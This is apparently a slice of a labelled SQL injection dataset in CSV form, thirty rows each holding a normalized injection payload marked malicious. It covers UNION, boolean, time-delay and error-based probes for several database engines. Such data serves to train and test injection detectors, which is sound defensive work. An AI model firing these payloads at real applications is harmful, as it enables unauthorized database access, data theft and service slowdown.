row_index,payload_norm,label,sqli_type_hint
10800,"1%"" union all select null,null,null,null,null,null,null,null,null,null#",1,
10801,"-7656"" ) ) ) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",1,
10802,"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",1,
10803,"1 ) ) as qzmg where 4344 = 4344 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
10804,"-5062"" ) ) ) union all select 4125,4125--",1,
10805,1 ) ) as xroy where 3274 = 3274,1,
10806,"1' ) union all select null,null,null,null,null,null,null,null--",1,
10807,"1"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""buwe"" = ""buwe",1,
10808,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""ssfu"" = ""ssfu",1,
10809,1%' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( '%' = ',1,
10810,"iif ( 5519 = 4796,1,1/0 )",1,
10811,"1"" ) ) as vhrq where 1690 = 1690 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
10812,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
10813,"1%"" ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
10814,select ( case when ( 1726 = 4080 ) then 1726 else 1/ ( select 0 ) end ) --,1,
10815,"1"" ) where 7548 = 7548",1,
10816,1'+ ( select sijr where 7250 = 7250,1,
10817,"-1162"" ) ) as mhmh where 8710 = 8710 or make_set ( 4822 = 7598,7598 ) --",1,
10818,"1 ) ) ) union all select null,null,null--",1,
10819,"1' ) ) as cbka where 3176 = 3176 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
10820,"1"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""ksrh"" = ""ksrh",1,
10821,"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,
10822,"-8661"" union all select 5731,5731--",1,
10823,"1' ) ) and make_set ( 3793 = 8118,8118 ) and ( ( 'swvc' like 'swvc",1,
10824,"-3226'|| ( select 'ykdw' where 2617 = 2617 union all select 2617,2617--",1,
10825,"-5513"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""ovmk"" like ""ovmk",1,
10826,waitfor delay '0:0:5' and ( ( '%' = ',1,
10827,"1"" ) and make_set ( 8403 = 8403,8899 ) and ( ""dhss"" = ""dhss",1,
10828,-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194,1,
10829,1'+ ( select 'qxmo' where 9511 = 9511 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
